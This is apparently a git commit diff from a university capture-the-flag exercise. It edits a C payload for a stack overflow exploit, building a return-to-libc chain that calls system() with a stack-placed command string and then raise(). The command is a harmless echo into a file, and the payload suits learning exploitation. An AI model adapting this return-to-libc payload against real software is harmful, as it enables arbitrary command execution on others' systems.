09e4319c2ccf1bcf29a5b2395a2443c67167c751
ebielawa <edward_bielawa@brown.edu>
2022-10-17 22:29:19 -0400

    Flag 4 Test 1

--- ctf-2/exp3.c
+++ ctf-2/exp3.c
@@ -23,9 +23,17 @@ unsigned char payload[] =
 	/* ------------------------------------	*/
 	/* BELOW IS THE FIRST RETURN ADDRESS OVERWRITTEN */
 	/* ------------------------------------	*/
-	"\x40\x8d\xe8\xb5"	// Address of raise (in memory)
-	"\xef\xbe\xad\xde"	// Fake return address
-	"\x0a\x00\x00\x00"	// SIGUSR1
+	"\x40\x90\xE9\xB5"	// System Address
+	"\x40\x8D\xE8\xB5"	// Raise Address (return address of System)
+	"\x80\xB6\xFF\xBF"	// Pointer to System's argument (on stack)
+	"\x0C\x00\x00\x00"	// Raise's Argument
+	"\x65\x63\x68\x6F"	// "echo"
+	"\x20\x2D\x6E\x20"	// " -n "
+	"\x78\x79\x7A\x7A"	// "xyzz"
+	"\x79\x21\x20\x3E"	// "y! >"
+	"\x20\x6D\x61\x67"	// " mag"
+	"\x69\x63\x2E\x74"	// "ic.t"
+	"\x78\x74\x00\x00"	// "xt\0\0"
 
 	/* USEFUL NOTES */
 	// 0xb5e710f0 is start address of libc text segment
